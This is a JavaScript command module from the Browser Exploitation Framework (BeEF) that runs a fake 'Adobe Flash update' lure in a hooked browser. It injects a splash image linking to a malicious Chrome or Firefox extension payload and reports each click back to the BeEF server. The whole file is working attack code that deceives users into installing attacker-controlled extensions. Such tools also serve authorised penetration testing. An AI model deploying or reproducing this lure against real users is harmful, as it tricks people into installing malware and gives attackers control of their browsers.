//
// Copyright (c) 2006-2012 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  
  	// Grab image and payload from config
  	var image = "<%== @image %>";
    var payload_type = "<%== @payload %>";
    var payload_root =  "<%== @payload_root %>";

    var chrome_extension = "/demos/adobe_flash_update.crx";
    var firefox_extension = "/api/ipec/ff_extension";
    var payload = "";
    switch (payload_type) {
        case "Chrome_Extension":
            payload = payload_root + chrome_extension;
            break;
        case "Firefox_Extension":
            payload = payload_root + firefox_extension;
            break;
        default:
            beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer=Error. No Payload selected.');
            break;
    }

  	// Add div to page
    var div = document.createElement('div');
	div.setAttribute('id', 'splash');
	div.setAttribute('style', 'position:absolute; top:30%; left:40%;');
	div.setAttribute('align', 'center');
	document.body.appendChild(div);
	div.innerHTML= '<a href=\'' + payload + '\' ><img src=\''+ image +'\'  /></a>';
    $j("#splash").click(function () {
      $j(this).hide();
        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer=user has accepted');
    });
});
